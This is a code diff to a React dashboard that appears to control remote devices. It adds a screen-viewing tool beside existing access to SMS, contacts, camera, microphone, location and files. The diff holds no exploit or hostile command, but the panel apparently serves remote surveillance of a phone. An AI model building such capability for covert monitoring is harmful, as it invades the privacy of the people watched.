@@ -16,6 +16,7 @@ import GalleryView from "@/components/views/GalleryView";
 import SmsView from "@/components/views/SmsView";
 import ContactsView from "@/components/views/ContactsView";
 import CameraView from "@/components/views/CameraView";
+import ScreenView from "@/components/views/ScreenView";
 import VoiceView from "@/components/views/VoiceView";
 import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
@@ -67,13 +68,16 @@ interface HomeProps {
     initialTool?: string | null;
 }
 
-const normalizeTool = (raw: string | null | undefined): 'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null => {
+export type ToolType = 'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'screen' | 'notifications' | 'audio' | 'location';
+
+const normalizeTool = (raw: string | null | undefined): ToolType | null => {
     if (!raw) return null;
     const clean = raw.toLowerCase().replace(/^\/+/, '').split('/')[0].trim();
     if (clean === 'voice' || clean === 'mic' || clean === 'microphone') return 'audio';
     if (clean === 'torch') return 'flashlight';
     if (clean === 'filemanager' || clean === 'file' || clean === 'explorer' || clean === 'files') return 'files';
-    if (['gallery', 'files', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'notifications', 'audio', 'location'].includes(clean)) {
+    if (clean === 'screen' || clean === 'mirror' || clean === 'screenshot' || clean === 'display') return 'screen';
+    if (['gallery', 'files', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'screen', 'notifications', 'audio', 'location'].includes(clean)) {
         return clean as any;
     }
     return null;
@@ -483,7 +487,7 @@ export default function Home(props: any) {
     }, []);
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null>(() => {
+    const [selectedTool, setSelectedTool] = useState<ToolType | null>(() => {
         const fromProp = normalizeTool(initialTool);
         if (fromProp) return fromProp;
         if (typeof window !== 'undefined') {
@@ -2675,6 +2679,21 @@ END:VCARD`;
                         selectedDeviceId={selectedDeviceId}
                     />
                 );
+            case 'screen': {
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                const isOnline = !!targetDevObj?.online;
+                const devName = targetDevObj ? getCleanDeviceName(targetDevObj) : undefined;
+                return (
+                    <ScreenView
+                        socket={socket}
+                        userUuid={userUuid}
+                        selectedDeviceId={effectiveTargetDevice}
+                        isOnline={isOnline}
+                        deviceName={devName}
+                    />
+                );
+            }
             case 'audio':
                 return (
                     <VoiceView
